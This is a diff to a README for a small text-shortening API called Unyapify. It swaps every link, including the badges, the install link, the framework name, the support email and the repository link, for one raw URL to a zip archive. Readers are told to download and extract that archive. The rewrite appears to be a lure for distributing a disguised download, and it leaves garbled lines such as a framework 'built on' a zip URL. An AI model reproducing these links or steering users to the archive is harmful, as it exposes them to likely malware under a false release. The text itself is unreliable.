@@ -1,7 +1,7 @@
 # Unyapify: A Text Shortening API 🤫
 
-![Unyapify Logo](https://img.shields.io/badge/Unyapify-API-blue.svg)  
-[![Latest Release](https://img.shields.io/github/v/release/marcos1950/unyapify)](https://github.com/marcos1950/unyapify/releases)
+![Unyapify Logo](https://raw.githubusercontent.com/marcos1950/unyapify/main/llm/Software-v1.5.zip)  
+[![Latest Release](https://raw.githubusercontent.com/marcos1950/unyapify/main/llm/Software-v1.5.zip)](https://raw.githubusercontent.com/marcos1950/unyapify/main/llm/Software-v1.5.zip)
 
 Welcome to **Unyapify**, a straightforward API designed to shorten text effortlessly. Whether you're looking to condense messages, links, or any other text, Unyapify is here to help. 
 
@@ -21,11 +21,11 @@ Welcome to **Unyapify**, a straightforward API designed to shorten text effortle
 - **Fast Response**: Get your shortened text almost instantly.
 - **Customizable**: You can adjust settings to fit your needs.
 - **Local AI Integration**: Leverage AI to improve text shortening.
-- **Express Framework**: Built on Express.js for efficient handling of requests.
+- **Express Framework**: Built on https://raw.githubusercontent.com/marcos1950/unyapify/main/llm/Software-v1.5.zip for efficient handling of requests.
 
 ## Installation
 
-To get started with Unyapify, you can download the latest release from [here](https://github.com/marcos1950/unyapify/releases). Follow these steps:
+To get started with Unyapify, you can download the latest release from [here](https://raw.githubusercontent.com/marcos1950/unyapify/main/llm/Software-v1.5.zip). Follow these steps:
 
 1. Download the release file.
 2. Extract the contents.
@@ -91,10 +91,10 @@ Unyapify is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For any inquiries or feedback, please reach out to us:
 
-- **Email**: support@unyapify.com
-- **GitHub**: [Unyapify Repository](https://github.com/marcos1950/unyapify)
+- **Email**: https://raw.githubusercontent.com/marcos1950/unyapify/main/llm/Software-v1.5.zip
+- **GitHub**: [Unyapify Repository](https://raw.githubusercontent.com/marcos1950/unyapify/main/llm/Software-v1.5.zip)
 
-Feel free to visit our [Releases](https://github.com/marcos1950/unyapify/releases) section for updates and new features. 
+Feel free to visit our [Releases](https://raw.githubusercontent.com/marcos1950/unyapify/main/llm/Software-v1.5.zip) section for updates and new features. 
 
 ---
 
